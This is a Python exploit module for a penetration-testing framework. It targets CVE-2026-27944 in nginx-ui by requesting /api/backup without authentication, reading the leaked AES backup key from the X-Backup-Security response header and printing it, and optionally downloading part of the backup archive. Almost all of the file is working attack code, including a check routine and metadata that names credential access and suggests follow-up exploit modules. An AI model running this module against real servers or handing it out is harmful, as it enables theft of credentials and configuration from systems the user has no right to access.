#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-27944 — nginx-ui unauthenticated /api/backup key + archive leak."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_BACKUP_KEY_RE = re.compile(r"X-Backup-Security:\s*([^\r\n]+)", re.I)


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "nginx-ui CVE-2026-27944 backup encryption key leak",
        "description": (
            "CVE-2026-27944 (< 2.3.3): unauthenticated GET /api/backup returns a full "
            "system backup ZIP and exposes the AES key in the X-Backup-Security response "
            "header, allowing offline decryption of credentials and configuration."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-27944"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-27944",
            "https://github.com/advisories/GHSA-g9w5-qffc-6762",
            "https://github.com/diamorphine666/CVE-2026-27944",
            "https://www.tenable.com/security/research/tra-2026-17",
        ],
        "tags": [
            "nginx-ui",
            "unauthenticated",
            "backup",
            "exposure",
            "cve-2026-27944",
            "kev",
        ],
        "agent": {
            "risk": "critical",
            "effects": ["credential_access", "active_exploitation"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "exploit_paths", "risk_signals"],
            "requires": {
                "endpoint_pattern_any": ["/api/backup"],
                "tech_hints_any": ["nginx-ui", "nginx"],
            },
            "chain": {
                "suggested_followups": [
                    "scanner/http/cve_2026_27944_detect",
                    "auxiliary/admin/http/nginx_ui_cve_2026_33032_mcp_bypass",
                ],
            },
        },
    }

    port = OptPort(9000, "nginx-ui HTTP port (default 9000)", required=False)
    ssl = OptBool(False, "Use HTTPS", required=False, advanced=True)
    download_body = OptBool(
        False,
        "Download backup ZIP body (can be large; key leak works from headers alone)",
        required=False,
    )
    max_bytes = OptInteger(
        65536,
        "Maximum backup bytes to retain when download_body is enabled",
        required=False,
        advanced=True,
    )

    def _fetch_backup(self):
        return self.http_request(
            method="GET",
            path="/api/backup",
            allow_redirects=False,
            stream=True,
        )

    def check(self):
        response = self._fetch_backup()
        if not response or int(response.status_code or 0) != 200:
            return {
                "vulnerable": False,
                "reason": "/api/backup not accessible",
                "confidence": "medium",
            }
        headers = "\r\n".join(f"{k}: {v}" for k, v in (response.headers or {}).items())
        if "X-Backup-Security" not in headers:
            return {
                "vulnerable": False,
                "reason": "Backup response missing X-Backup-Security header",
                "confidence": "medium",
            }
        ctype = str(response.headers.get("Content-Type") or "")
        if "zip" not in ctype.lower() and "octet-stream" not in ctype.lower():
            return {
                "vulnerable": False,
                "reason": "Unexpected backup content type",
                "confidence": "low",
            }
        result = {
            "vulnerable": True,
            "reason": "Unauthenticated backup with encryption key in header",
            "confidence": "high",
        }
        try:
            response.close()
        except Exception:
            pass
        return result

    def run(self):
        response = self._fetch_backup()
        if not response:
            print_error("No response from /api/backup")
            return False
        if int(response.status_code or 0) != 200:
            print_error(f"/api/backup HTTP {response.status_code}")
            return False

        headers = "\r\n".join(f"{k}: {v}" for k, v in (response.headers or {}).items())
        match = _BACKUP_KEY_RE.search(headers)
        key = match.group(1).strip() if match else ""
        disposition = str(response.headers.get("Content-Disposition") or "")
        ctype = str(response.headers.get("Content-Type") or "")

        if not key:
            print_error("X-Backup-Security header missing — target may be patched")
            return False

        print_success("Backup encryption key leaked in X-Backup-Security")
        print_status(f"Key: {key[:120]}{'…' if len(key) > 120 else ''}")
        if disposition:
            print_status(f"Content-Disposition: {disposition}")
        print_status(f"Content-Type: {ctype}")

        body_len = 0
        sample = b""
        if self.download_body:
            cap = max(1024, int(self.max_bytes or 65536))
            chunks = []
            for chunk in response.iter_content(chunk_size=8192):
                if not chunk:
                    break
                chunks.append(chunk)
                body_len += len(chunk)
                if body_len >= cap:
                    break
            sample = b"".join(chunks)[:cap]
            print_status(f"Downloaded {body_len} byte(s) of backup archive (capped)")
        else:
            try:
                response.close()
            except Exception:
                pass

        self.set_info(
            severity="critical",
            cve="CVE-2026-27944",
            reason="nginx-ui backup key disclosure",
            path="/api/backup",
            backup_key_prefix=key[:32],
            content_type=ctype,
            bytes_sampled=len(sample),
        )
        return True
